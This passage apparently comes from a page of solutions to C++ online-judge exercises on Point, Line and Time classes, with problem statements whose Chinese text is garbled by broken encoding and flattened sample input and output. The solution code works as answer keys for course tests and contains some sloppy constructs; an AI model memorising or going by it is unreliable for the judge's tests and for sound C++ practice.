    void show()&#123;cout &lt;&lt; &quot;Line : (&quot; &lt;&lt; p1.x &lt;&lt; &quot;, &quot; &lt;&lt; p1.y &lt;&lt; &quot;) to (&quot; &lt;&lt; p2.x &lt;&lt; &quot;, &quot; &lt;&lt; p2.y &lt;&lt; &quot;)&quot; &lt;&lt; endl;&#125;
    void readLine()&#123;
        double x1, y1, x2, y2;  
        char c;  
        cin &gt;&gt; x1 &gt;&gt; c &gt;&gt; y1 &gt;&gt; x2 &gt;&gt; c &gt;&gt; y2;  
        SetLine(x1, y1, x2, y2);  

    &#125;
    Line&amp; SetLine(double a,double b,double c,double d)  
    &#123;  
        p1.x = a;  
        p1.y = b;  
        p2.x = c;  
        p2.y = d;
        return *this;  
    &#125;  
    Line&amp; setLine(const Point&amp; p, const Point&amp; q)&#123;
        p1.x = p.x;  
        p1.y = p.y;  
        p2.x = q.x;  
        p2.y = q.y;
        return *this;         
    &#125;
    Line&amp; setLine(const Line&amp; l)&#123;
        p1.x = l.p1.x;  
        p1.y = l.p1.y;  
        p2.x = l.p2.x;  
        p2.y = l.p2.y;
        return *this;         
    &#125;
&#125;;
/////////////////////////
int main()
&#123;
    int num, i;
    Point p(1, -2), q(2, -1), t;
    t.show();
    std::cin&gt;&gt;num;
    Line line[num];
    for(i = 0; i &lt; num; i++)
    &#123;
        line[i].readLine();
        line[i].show();
    &#125;
    Line l1(p, q), l2(p,t), l3(q,t), l4(l1);
    l1.show();
    l2.setLine(l1).show();
    l3.show();
    l4.setLine(t,q).show();
&#125;</code></pre>
<h3 id="22-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-VI"><a href="#22-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-VI" class="headerlink" title="22.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (VI)"></a>22.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (VI)</h3><blockquote>
<h2 id="Description-21"><a href="#Description-21" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Lineå¯¹è±¡å’ŒPointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºPointå¯¹è±¡ã€‚</p>
<p>Point::x()æ–¹æ³•ï¼šå–xåæ ‡ã€‚</p>
<p>Point::y()æ–¹æ³•ï¼šå–yåæ ‡ã€‚</p>
<p>Line::show()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºLineå¯¹è±¡ã€‚</p>
<p>Line::SetLine(double, double, double, double)æ–¹æ³•ï¼šè®¾ç½®Lineå¯¹è±¡èµ·ç‚¹çš„x,yåæ ‡ï¼ˆç¬¬ä¸€ä¸ªå’Œç¬¬äºŒå‚æ•°ï¼‰å’Œç»ˆç‚¹çš„x,yåæ ‡ï¼ˆç¬¬ä¸‰ä¸ªå’Œç¬¬å››ä¸ªåæ ‡ï¼‰ï¼Œå¹¶è¿”å›æœ¬å¯¹è±¡</p>
<p>Line::SetLine(const Point &amp;, const Point &amp;)æ–¹æ³•ï¼šè®¾ç½®Lineå¯¹è±¡çš„èµ·ç‚¹ï¼ˆç¬¬ä¸€ä¸ªå‚æ•°ï¼‰å’Œç»ˆç‚¹ï¼ˆç¬¬äºŒä¸ªåæ ‡ï¼‰ï¼Œå¹¶è¿”å›æœ¬å¯¹è±¡</p>
<p>Line::SetLine(const Line&amp;)æ–¹æ³•ï¼šè®¾ç½®Lineå¯¹è±¡ï¼Œå¤åˆ¶å‚æ•°çš„åæ ‡ï¼Œå¹¶è¿”å›æœ¬å¯¹è±¡</p>
<p>Line::readLine()æ–¹æ³•ï¼šä»æ ‡å‡†è¾“å…¥ä¸Šè¯»å…¥åæ ‡ï¼Œæ ¼å¼è§Sample</p>
<p>Line::start()æ–¹æ³•ï¼šå–Lineçš„èµ·ç‚¹</p>
<p>Line::end()æ–¹æ³•ï¼šå–Lineçš„ç»ˆç‚¹</p>
<p>Line::setStart()æ–¹æ³•ï¼šè®¾ç½®Lineçš„èµ·ç‚¹</p>
<p>Line::setEnd()æ–¹æ³•ï¼šè®¾ç½®Lineçš„ç»ˆç‚¹</p>
<p>ä»¥ä¸‹ä¸‰ä¸ªå‡½æ•°ç”¨äºè¾“å‡ºLineå¯¹è±¡ï¼Œæ ¼å¼åŒsample</p>
<p>showLineCoordinate(const Line&amp;)</p>
<p>showLinePoint(const Line&amp;)</p>
<p>showLine(const Line&amp;)</p>
<h2 id="Input-21"><a href="#Input-21" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚</p>
<p>æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-21"><a href="#Output-21" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºä¸ºå¤šè¡Œï¼Œæ¯è¡Œä¸ºä¸€æ¡çº¿æ®µï¼Œèµ·ç‚¹åæ ‡åœ¨å‰ç»ˆç‚¹åæ ‡åœ¨åï¼Œæ¯ä¸ªç‚¹çš„Xåæ ‡åœ¨å‰ï¼ŒYåæ ‡åœ¨åï¼ŒYåæ ‡å‰é¢å¤šè¾“å‡ºä¸€ä¸ªç©ºæ ¼ï¼Œç”¨æ‹¬å·åŒ…è£¹èµ·æ¥ã€‚è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-21"><a href="#Sample-Input-21" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>40,0 1,11,1 2,32,3 4,50,1 1,0</p>
<h2 id="Sample-Output-21"><a href="#Sample-Output-21" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Point : (1, -2) is created.Point : (2, -1) is created.Point : (0, 0) is created.Point : (0, 0)Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Point : (0, 0) is created.Point : (0, 0) is created.Line : (0, 0) to (0, 0) is created.Line : (0, 0) to (1, 1)Line : (1, 1) to (2, 3)Line : (2, 3) to (4, 5)Line : (0, 1) to (1, 0)Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is created.Point : (1, -2) is copied.Point : (0, 0) is copied.Line : (1, -2) to (0, 0) is created.Point : (2, -1) is copied.Point : (0, 0) is copied.Line : (2, -1) to (0, 0) is created.Point : (1, -2) is copied.Point : (2, -1) is copied.Line : (1, -2) to (2, -1) is copied.Line : (1, -2) to (2, -1)Line : Point : (1, -2) to Point : (0, 0)Line : Point : (1, -2) to Point : (2, -1)Line : (0, 0) to (2, -1)Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (1, -2) to (0, 0) is erased.Point : (0, 0) is erased.Point : (1, -2) is erased.Line : (1, -2) to (2, -1) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.Line : (0, 1) to (1, 0) is erased.Point : (1, 0) is erased.Point : (0, 1) is erased.Line : (2, 3) to (4, 5) is erased.Point : (4, 5) is erased.Point : (2, 3) is erased.Line : (1, 1) to (2, 3) is erased.Point : (2, 3) is erased.Point : (1, 1) is erased.Line : (0, 0) to (1, 1) is erased.Point : (1, 1) is erased.Point : (0, 0) is erased.Line : (0, 0) to (2, -1) is erased.Point : (2, -1) is erased.Point : (0, 0) is erased.Point : (0, 0) is erased.Point : (2, -1) is erased.Point : (1, -2) is erased.</p>
<h2 id="HINT-21"><a href="#HINT-21" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-21"><a href="#Append-Code-21" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1332&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;  
using namespace std;  
#include &lt;iomanip&gt;  
class Point&#123;  
private:  
    double x_,y_;  
    friend class Line;  
public:  
    Point(double x,double y)  
    &#123;  
        x_ = x;  
        y_ = y;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Point()  
    &#123;  
        x_ = 0;  
        y_ = 0;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Point(double a):x_(a),y_(a) &#123; cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;  
    void setvalue(double xx,double yy)  
    &#123;  
        x_ = xx;  
        y_ = yy;  
    &#125;  
    //void setx(int xx) &#123;x_ = xx;&#125;  
    //void sety(int yy) &#123;y_ = yy;&#125;  
    void show()  
    &#123;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
    &#125;  
    double x() const &#123; return x_;&#125;  
    double y() const &#123; return y_;&#125;  
    Point(const Point &amp;p)  
    &#123;  
        x_ = p.x_;  
        y_ = p.y_;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;  
    &#125;  
    ~Point()  
    &#123;  
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;  
    &#125;  
    void showNoEndOfLine()const&#123;cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;)&quot;;&#125;  
&#125;;  

class Line&#123;  
private:  
    Point x1_,y1_;  
    double x1,y1,x2,y2;  
    friend class Point;  
public:  
    Line(double xx1,double yy1,double xx2,double yy2):x1_(xx1,yy1),y1_(xx2,yy2)  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Line(Point &amp;q1,Point &amp;q2):x1_(q1),y1_(q2)  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;  
    &#125;  
    Line(const Line&amp;I):x1_(I.x1_),y1_(I.y1_) &#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;&#125;  
    Line():x1_(),y1_()&#123;cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;&#125;  
    Line &amp;setLine(double xx3,double yy3,double xx4,double yy4)  
    &#123;  
        x1_.x_ = xx3;  
        x1_.y_ = yy3;  
        y1_.x_ = xx4;  
        y1_.y_ = yy4;  
        return *this;  
    &#125;  
    void show() const  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;  
    &#125;  
    ~Line()  
    &#123;  
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;  
    &#125;  
    Line &amp;setLine(const Point &amp;p1,const Point &amp;p2)  
    &#123;  
        x1_ = p1;  
        y1_ = p2;  
        return *this;  
    &#125;  
    Line &amp;setLine(const Line&amp; q)  
    &#123;  
       *this = q;  
       return *this;  
    &#125;  
    void readLine()  
    &#123;  
       double x1,y1,x2,y2;  
       char c;  
       cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;  
       x1_.x_ = x1;  
       x1_.y_ = y1;  
       y1_.x_ = x2;  
       y1_.y_ = y2;  
    &#125;  
    const Point &amp;start() const  
    &#123;  
        return x1_;  
    &#125;  
    const Point &amp;end() const  
    &#123;  
        return y1_;  
    &#125;  
    void setStart(Point &amp;c) &#123;x1_ = c;&#125;  
    void setEnd(Point &amp;e) &#123;y1_ = e;&#125;  
&#125;;  
void showLineCoordinate(const Line&amp; line)  
&#123;  
    std::cout&lt;&lt;&quot;Line : &quot;;  
    std::cout&lt;&lt;&quot;(&quot;&lt;&lt;line.start().x()&lt;&lt;&quot;, &quot;&lt;&lt;line.start().y()&lt;&lt;&quot;)&quot;;  
    std::cout&lt;&lt;&quot; to &quot;;  
    std::cout&lt;&lt;&quot;(&quot;&lt;&lt;line.end().x()&lt;&lt;&quot;, &quot;&lt;&lt;line.end().y()&lt;&lt;&quot;)&quot;;  
    std::cout&lt;&lt;std::endl;  
&#125;  

void showLinePoint(const Line&amp; line)  
&#123;  
    std::cout&lt;&lt;&quot;Line : &quot;;  
    line.start().showNoEndOfLine();  
    std::cout&lt;&lt;&quot; to &quot;;  
    line.end().showNoEndOfLine();  
    std::cout&lt;&lt;std::endl;  
&#125;  

void showLine(const Line&amp; line)  
&#123;  
    line.show();  
&#125;  

int main()  
&#123;  
    int num, i;  
    Point p(1, -2), q(2, -1), t;  
    t.show();  
    std::cin&gt;&gt;num;  
    Line line[num + 1];  
    for(i = 1; i &lt;= num; i++)  
    &#123;  
        line[i].readLine();  
        showLine(line[i]);  
    &#125;  
    Line l1(p, q), l2(p,t), l3(q,t), l4(l1);  
    showLineCoordinate(l1);  
    showLinePoint(l2);  
    showLinePoint(l3.setLine(l1));  
    showLineCoordinate(l4.setLine(t,q));  
    line[0].setStart(t);  
    line[0].setEnd(q);  
&#125;  1</code></pre>
<h3 id="23-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-VII"><a href="#23-å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±»-VII" class="headerlink" title="23.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (VII)"></a>23.å¹³é¢ä¸Šçš„ç‚¹å’Œçº¿â€”â€”Pointç±»ã€Lineç±» (VII)</h3><blockquote>
<h2 id="Description-22"><a href="#Description-22" class="headerlink" title="Description"></a>Description</h2><p>åœ¨æ•°å­¦ä¸Šï¼Œå¹³é¢ç›´è§’åæ ‡ç³»ä¸Šçš„ç‚¹ç”¨Xè½´å’ŒYè½´ä¸Šçš„ä¸¤ä¸ªåæ ‡å€¼å”¯ä¸€ç¡®å®šï¼Œä¸¤ç‚¹ç¡®å®šä¸€æ¡çº¿æ®µã€‚ç°åœ¨æˆ‘ä»¬å°è£…ä¸€ä¸ªâ€œPointç±»â€å’Œâ€œLineç±»â€æ¥å®ç°å¹³é¢ä¸Šçš„ç‚¹çš„æ“ä½œã€‚</p>
<p>æ ¹æ®â€œappend.ccâ€ï¼Œå®ŒæˆPointç±»å’ŒLineç±»çš„æ„é€ æ–¹æ³•å’Œshow()æ–¹æ³•ï¼Œè¾“å‡ºå„Lineå¯¹è±¡å’ŒPointå¯¹è±¡çš„æ„é€ å’Œææ„æ¬¡åºã€‚</p>
<p>æ¥å£æè¿°ï¼š</p>
<p>Point::showCounter()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºå½“å‰ç¨‹åºä¸­Pointå¯¹è±¡çš„è®¡æ•°ã€‚</p>
<p>Point::showSum()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºç¨‹åºè¿è¡Œè‡³å½“å‰å­˜åœ¨è¿‡çš„Pointå¯¹è±¡æ€»æ•°ã€‚</p>
<p>Line::showCounter()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºå½“å‰ç¨‹åºä¸­Lineå¯¹è±¡çš„è®¡æ•°ã€‚</p>
<p>Line::showSum()æ–¹æ³•ï¼šæŒ‰æ ¼å¼è¾“å‡ºç¨‹åºè¿è¡Œè‡³å½“å‰å­˜åœ¨è¿‡çš„Lineå¯¹è±¡æ€»æ•°ã€‚</p>
<h2 id="Input-22"><a href="#Input-22" class="headerlink" title="Input"></a>Input</h2><p>è¾“å…¥çš„ç¬¬ä¸€è¡Œä¸ºNï¼Œè¡¨ç¤ºåé¢æœ‰Nè¡Œæµ‹è¯•æ ·ä¾‹ã€‚</p>
<p>æ¯è¡Œä¸ºä¸¤ç»„åæ ‡â€œx,yâ€ï¼Œåˆ†åˆ«è¡¨ç¤ºçº¿æ®µèµ·ç‚¹å’Œç»ˆç‚¹çš„xåæ ‡å’Œyåæ ‡ï¼Œä¸¤ç»„åæ ‡é—´ç”¨ä¸€ä¸ªç©ºæ ¼åˆ†å¼€ï¼Œxå’Œyçš„å€¼éƒ½åœ¨doubleæ•°æ®èŒƒå›´å†…ã€‚</p>
<h2 id="Output-22"><a href="#Output-22" class="headerlink" title="Output"></a>Output</h2><p>è¾“å‡ºæ ¼å¼è§sampleã€‚</p>
<p>Cè¯­è¨€çš„è¾“å…¥è¾“å‡ºè¢«ç¦ç”¨ã€‚</p>
<h2 id="Sample-Input-22"><a href="#Sample-Input-22" class="headerlink" title="Sample Input"></a>Sample Input</h2><p>40,0 1,11,1 2,32,3 4,50,1 1,0</p>
<h2 id="Sample-Output-22"><a href="#Sample-Output-22" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>Current : 3 points.In total : 3 points.Current : 6 lines.In total : 6 lines.Current : 17 points.In total : 17 points.Current : 6 lines.In total : 7 lines.Current : 15 points.In total : 17 points.Current : 6 lines.In total : 8 lines.Current : 17 points.In total : 21 points.Current : 6 lines.In total : 9 lines.Current : 15 points.In total : 21 points.Current : 6 lines.In total : 10 lines.Current : 17 points.In total : 25 points.Current : 6 lines.In total : 11 lines.Current : 15 points.In total : 25 points.Current : 6 lines.In total : 12 lines.Current : 17 points.In total : 29 points.Current : 6 lines.In total : 13 lines.Current : 15 points.In total : 29 points.Current : 9 lines.In total : 17 lines.Current : 21 points.In total : 37 points.Current : 13 lines.In total : 21 lines.Current : 21 points.In total : 45 points.</p>
<h2 id="HINT-22"><a href="#HINT-22" class="headerlink" title="HINT"></a>HINT</h2><h2 id="Append-Code-22"><a href="#Append-Code-22" class="headerlink" title="Append Code"></a>Append Code</h2><p><a href="http://192.168.119.211/JudgeOnline/append_detail.php?lang=1&pid=1333&getkey=">append.cc</a>,</p>
</blockquote>
<pre><code>#include &lt;iostream&gt;
using namespace std;
#include &lt;iomanip&gt;
class Point&#123;
private:
    double x_,y_;
    friend class Line;
    static int sta1;
    static int sta2;
public:
    Point(double x,double y)
    &#123;
        x_ = x;
        y_ = y;
        sta1++;
        sta2++;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    Point(double d)
    &#123;
        x_ = d;
        y_ = d;
        sta1++;
        sta2++;
    &#125;
    Point()
    &#123;
        x_ = 0;
        y_ = 0;
        sta1++;
        sta2++;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    void setvalue(double xx,double yy)
    &#123;
        x_ = xx;
        y_ = yy;
    &#125;
    void setx(int xx) &#123;x_ = xx;&#125;
    void sety(int yy) &#123;y_ = yy;&#125;
    void show()
    &#123;
        cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    &#125;
    int x() &#123; return x_;&#125;
    int y() &#123; return y_;&#125;
    Point(const Point &amp;p)
    &#123;
        sta1++;
        sta2++;
        x_ = p.x_;
        y_ = p.y_;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;
    &#125;
    ~Point()
    &#123;
       sta1 = sta1 - 1;
        //cout&lt;&lt;&quot;Point : (&quot;&lt;&lt;x_&lt;&lt;&quot;, &quot;&lt;&lt;y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;
    &#125;
    static void showCounter()
    &#123;
        cout&lt;&lt;&quot;Current : &quot;&lt;&lt;sta1&lt;&lt;&quot; points.&quot;&lt;&lt;endl;
    &#125;
    static void showSum()
    &#123;
        cout&lt;&lt;&quot;In total : &quot;&lt;&lt;sta2&lt;&lt;&quot; points.&quot;&lt;&lt;endl;
    &#125;
&#125;;
 int Point::sta1(0);
 int Point::sta2(0);
class Line&#123;friend class Point;
private:
    Point x1_,y1_;
    double x1,y1,x2,y2;


public:static int sta3;
    static int sta4;
    Line(double xx1,double yy1,double xx2,double yy2):x1_(xx1,yy1),y1_(xx2,yy2)
    &#123;
        sta3++;
        sta4++;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    Line(Point &amp;q1,Point &amp;q2):x1_(q1),y1_(q2)
    &#123;
        sta3++;
        sta4++;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;
    &#125;
    Line():x1_(),y1_()&#123;sta3++; sta4++;/*cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is created.&quot;&lt;&lt;endl;*/&#125;
    Line setLine(double xx3,double yy3,double xx4,double yy4)
    &#123;

        sta3++;
        sta4++;
        x1_.x_ = xx3;
        x1_.y_ = yy3;
        y1_.x_ = xx4;
        y1_.y_ = yy4;
        return *this;
    &#125;
    void show()
    &#123;
        cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;)&quot;&lt;&lt;endl;
    &#125;
    ~Line()
    &#123;
        sta3 = sta3 - 1;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is erased.&quot;&lt;&lt;endl;
    &#125;
    Line &amp;setLine(const Point &amp;p1,const Point &amp;p2)
    &#123;
        x1_ = p1;
        y1_ = p2;
        return *this;
    &#125;
    Line &amp;setLine(const Line&amp; q)
    &#123;
       x1_ = q.x1_;
       y1_ = q.y1_;
       return *this;
    &#125;
    void readLine()
    &#123;
       double x1,y1,x2,y2;
       char c;
       cin&gt;&gt;x1&gt;&gt;c&gt;&gt;y1&gt;&gt;x2&gt;&gt;c&gt;&gt;y2;
       x1_.x_ = x1;
       x1_.y_ = y1;
       y1_.x_ = x2;
       y1_.y_ = y2;
    &#125;
    Line(const Line &amp;b):x1_(b.x1_),y1_(b.y1_)
    &#123;
        sta3++;
        sta4++;
        //cout&lt;&lt;&quot;Line : (&quot;&lt;&lt;x1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;x1_.y_&lt;&lt;&quot;) to (&quot;&lt;&lt;y1_.x_&lt;&lt;&quot;, &quot;&lt;&lt;y1_.y_&lt;&lt;&quot;) is copied.&quot;&lt;&lt;endl;
    &#125;
    static void showCounter()
    &#123;
        cout&lt;&lt;&quot;Current : &quot;&lt;&lt;sta3&lt;&lt;&quot; lines.&quot;&lt;&lt;endl;
    &#125;
    static void showSum()
    &#123;
        cout&lt;&lt;&quot;In total : &quot;&lt;&lt;sta4&lt;&lt;&quot; lines.&quot;&lt;&lt;endl;
    &#125;
&#125;;
int Line::sta3 = 0;
int Line::sta4(0);

int main()
&#123;
    int num, i;
    Point p(1, -2), q(2, -1), t;
    t.showCounter();
    t.showSum();
    std::cin&gt;&gt;num;
    Line line[num + 1];
    for(i = 1; i &lt;= num; i++)
    &#123;
        Line *l1, l2;
        l1-&gt;showCounter();
        l1-&gt;showSum();
        l1 = new Line(p, q);
        line[i].readLine();
        p.showCounter();
        p.showSum();
        delete l1;
        l2.showCounter();
        l2.showSum();
        q.showCounter();
        q.showSum();
    &#125;
    Line l1(p, q), l2(p,t), l3(q,t), l4(l1);
    Line::showCounter();
    Line::showSum();
    Point::showCounter();
    Point::showSum();
    Line *l = new Line[num];
    l4.showCounter();
    l4.showSum();
    delete[] l;
    t.showCounter();
    t.showSum();
&#125;

</code></pre>
<h3 id="24-æ—¶é—´ç±»çš„æ„é€ å’Œè¾“å‡º"><a href="#24-æ—¶é—´ç±»çš„æ„é€ å’Œè¾“å‡º" class="headerlink" title="24.æ—¶é—´ç±»çš„æ„é€ å’Œè¾“å‡º"></a>24.æ—¶é—´ç±»çš„æ„é€ å’Œè¾“å‡º</h3><blockquote>
<h2 id="Description-23"><a href="#Description-23" class="headerlink" title="Description"></a>Description</h2><p>å°è£…ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œç”¨äºæ—¶é—´å¤„ç†çš„ç›¸å…³åŠŸèƒ½ï¼Œæ”¯æŒä»¥ä¸‹æ“ä½œï¼š</p>
<p>\1. Time::Time(int,int,int)æ„é€ æ–¹æ³•ï¼šä¼ é€’æ—¶åˆ†ç§’çš„ä¸‰ä¸ªå‚æ•°æ„é€ å¯¹è±¡ã€‚</p>
<p>\2. Time::showTime()æ–¹æ³•ï¼šè¾“å‡ºâ€œhh:mm:ssâ€ï¼Œä¸è¶³ä¸¤ä½çš„è¦å‰é¢è¡¥0ã€‚</p>
<p>ä½ è®¾è®¡ä¸€ä¸ªæ—¶é—´ç±»Timeï¼Œä½¿å¾—main()å‡½æ•°èƒ½å¤Ÿæ­£ç¡®è¿è¡Œã€‚</p>
<p>å‡½æ•°è°ƒç”¨æ ¼å¼è§append.ccã€‚</p>
